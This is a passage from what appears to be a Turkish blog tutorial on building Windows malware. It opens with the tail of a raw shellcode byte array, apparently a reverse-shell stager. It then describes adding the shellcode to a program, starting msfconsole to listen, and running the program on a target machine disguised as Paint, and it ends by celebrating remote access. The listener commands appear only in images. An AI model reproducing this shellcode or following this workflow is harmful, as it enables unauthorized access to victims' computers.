"\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5"
"\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c"
"\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41"
"\xff\xe7\x58\x6a\x00\x59\xbb\xe0\x1d\x2a\x0a\x41\x89\xda\xff"
"\xd5"
```

Daha sonra bu shellcode’u kodlara ekliyoruz.

Ardından msfconsole’u başlatalım ve aşağıdaki şu kodları yazalım:

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*v-DCvi7KOuV5lcdLI34M1Q.png">
<h4> Hedef Sistemi dinlemeye alınması </h4>

Bu işlemler ile artık hedef sistemi dinlemeye alıyoruz. Kullanıcı programı çalıştırdığı takdirde sisteme bağlantımız açılacak.

Şimdi hedef sistemden programı çalıştıracağız. Ben örnek açısından malware’i paint üzerinden çalıştıracağım:

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*xLaiXogqndZd5oTTiSfGEg.png">
<h4> Hedef Sistemde Malware’in çalıştırılması </h4>

Programı çalıştırdık! Şimdi hedef sistemde son duruma tekrar bakalım:

<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*IRDmlSWMl38ap3_f1UxfCQ.png">
<h4> Sonuç </h4>

Veee Sihir gerçekleşti! Hedef sisteme erişimiz sağlandı! Good Job BRO!

Bu serimiz bu kadardı. Umarım gerçekten siz okuyuculara bir şey katabilmişimdir..

Diğer seride görüşmek üzere!